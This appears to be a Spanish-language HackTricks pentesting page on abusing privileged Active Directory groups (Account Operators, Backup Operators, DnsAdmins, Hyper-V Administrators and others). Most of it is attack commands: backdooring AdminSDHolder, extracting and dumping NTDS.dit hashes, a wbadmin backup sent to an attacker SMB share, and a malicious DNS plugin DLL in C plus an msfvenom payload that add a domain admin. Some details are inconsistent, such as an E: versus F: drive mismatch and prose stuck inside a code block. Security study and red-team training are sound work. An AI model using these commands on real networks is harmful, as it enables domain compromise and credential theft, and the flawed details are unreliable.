# Grupos Privilegiados

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir y **automatizar flujos de trabajo** fácilmente, impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Grupos bien conocidos con privilegios de administración

* **Administradores**
* **Administradores de Dominio**
* **Administradores de Empresa**

## Operadores de Cuenta

Este grupo tiene la capacidad de crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el Controlador de Dominio (DC).

Para identificar a los miembros de este grupo, se ejecuta el siguiente comando:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Agregar nuevos usuarios está permitido, así como el inicio de sesión local en DC01.

## Grupo AdminSDHolder

La lista de control de acceso (ACL) del grupo **AdminSDHolder** es crucial, ya que establece permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos de alto privilegio. Este mecanismo garantiza la seguridad de estos grupos al prevenir modificaciones no autorizadas.

Un atacante podría explotar esto modificando la ACL del grupo **AdminSDHolder**, otorgando permisos completos a un usuario estándar. Esto le daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de este usuario se alteran o eliminan, se restablecerían automáticamente dentro de una hora debido al diseño del sistema.

Los comandos para revisar los miembros y modificar permisos incluyen:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Un script está disponible para acelerar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Papelera de reciclaje de AD

La membresía en este grupo permite la lectura de objetos de Active Directory eliminados, lo que puede revelar información sensible:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Acceso al Controlador de Dominio

El acceso a los archivos en el DC está restringido a menos que el usuario sea parte del grupo `Server Operators`, lo que cambia el nivel de acceso.

### Escalación de Privilegios

Usando `PsService` o `sc` de Sysinternals, se puede inspeccionar y modificar los permisos de los servicios. El grupo `Server Operators`, por ejemplo, tiene control total sobre ciertos servicios, lo que permite la ejecución de comandos arbitrarios y la escalación de privilegios:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` tienen acceso completo, lo que permite la manipulación de servicios para obtener privilegios elevados.

## Backup Operators

La membresía en el grupo `Backup Operators` proporciona acceso al sistema de archivos `DC01` debido a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten la navegación por carpetas, la enumeración y la capacidad de copiar archivos, incluso sin permisos explícitos, utilizando la bandera `FILE_FLAG_BACKUP_SEMANTICS`. Es necesario utilizar scripts específicos para este proceso.

Para listar los miembros del grupo, ejecute:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque Local

Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:

1. Importar las bibliotecas necesarias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilitar y verificar `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acceder y copiar archivos de directorios restringidos, por ejemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

El acceso directo al sistema de archivos del Controlador de Dominio permite el robo de la base de datos `NTDS.dit`, que contiene todos los hashes NTLM para usuarios y computadoras del dominio.

#### Using diskshadow.exe

1. Crear una copia sombra de la unidad `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copiar `NTDS.dit` de la copia de sombra:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativamente, utiliza `robocopy` para copiar archivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraer `SYSTEM` y `SAM` para la recuperación de hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos los hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Usando wbadmin.exe

1. Configura el sistema de archivos NTFS para el servidor SMB en la máquina atacante y almacena en caché las credenciales SMB en la máquina objetivo.
2. Usa `wbadmin.exe` para la copia de seguridad del sistema y la extracción de `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para una demostración práctica, consulta [VIDEO DEMOSTRATIVO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden explotar sus privilegios para cargar un DLL arbitrario con privilegios de SYSTEM en un servidor DNS, a menudo alojado en Controladores de Dominio. Esta capacidad permite un potencial de explotación significativo.

Para listar los miembros del grupo DnsAdmins, usa:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Ejecutar DLL arbitraria

Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) utilizando comandos como:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Reiniciar el servicio DNS (lo que puede requerir permisos adicionales) es necesario para que se cargue el DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para más detalles sobre este vector de ataque, consulte ired.team.

#### Mimilib.dll
También es factible usar mimilib.dll para la ejecución de comandos, modificándolo para ejecutar comandos específicos o shells inversos. [Consulte esta publicación](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para más información.

### Registro WPAD para MitM
DnsAdmins pueden manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) creando un registro WPAD después de deshabilitar la lista de bloqueo de consultas global. Herramientas como Responder o Inveigh se pueden usar para suplantar y capturar tráfico de red.

### Lectores de Registros de Eventos
Los miembros pueden acceder a los registros de eventos, encontrando potencialmente información sensible como contraseñas en texto plano o detalles de ejecución de comandos:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permisos de Windows de Exchange
Este grupo puede modificar DACLs en el objeto de dominio, lo que podría otorgar privilegios de DCSync. Las técnicas para la escalada de privilegios que explotan este grupo se detallan en el repositorio de GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administradores de Hyper-V
Los Administradores de Hyper-V tienen acceso completo a Hyper-V, lo que puede ser explotado para obtener control sobre Controladores de Dominio virtualizados. Esto incluye clonar DCs en vivo y extraer hashes NTLM del archivo NTDS.dit.

### Ejemplo de Explotación
El Servicio de Mantenimiento de Mozilla Firefox puede ser explotado por los Administradores de Hyper-V para ejecutar comandos como SYSTEM. Esto implica crear un enlace duro a un archivo protegido de SYSTEM y reemplazarlo con un ejecutable malicioso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: La explotación de enlaces duros ha sido mitigada en las actualizaciones recientes de Windows.

## Organización de Gestión

En entornos donde se despliega **Microsoft Exchange**, un grupo especial conocido como **Organización de Gestión** posee capacidades significativas. Este grupo tiene privilegios para **acceder a los buzones de todos los usuarios del dominio** y mantiene **control total sobre la Unidad Organizativa (OU) 'Grupos de Seguridad de Microsoft Exchange'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede ser explotado para la escalación de privilegios.

### Explotación de Privilegios y Comandos

#### Operadores de Impresión
Los miembros del grupo **Operadores de Impresión** están dotados de varios privilegios, incluyendo el **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un Controlador de Dominio**, apagarlo y gestionar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto no elevado, es necesario eludir el Control de Cuentas de Usuario (UAC).

Para listar los miembros de este grupo, se utiliza el siguiente comando de PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Para obtener técnicas de explotación más detalladas relacionadas con **`SeLoadDriverPrivilege`**, se deben consultar recursos de seguridad específicos.

#### Usuarios de Escritorio Remoto
A los miembros de este grupo se les concede acceso a PCs a través del Protocolo de Escritorio Remoto (RDP). Para enumerar a estos miembros, están disponibles comandos de PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Más información sobre la explotación de RDP se puede encontrar en recursos dedicados de pentesting.

#### Usuarios de Gestión Remota
Los miembros pueden acceder a PCs a través de **Windows Remote Management (WinRM)**. La enumeración de estos miembros se logra a través de:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para las técnicas de explotación relacionadas con **WinRM**, se debe consultar la documentación específica.

#### Operadores de Servidor
Este grupo tiene permisos para realizar varias configuraciones en los Controladores de Dominio, incluyendo privilegios de respaldo y restauración, cambio de hora del sistema y apagado del sistema. Para enumerar los miembros, el comando proporcionado es:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Referencias <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) para construir y **automatizar flujos de trabajo** fácilmente impulsados por las **herramientas comunitarias más avanzadas** del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
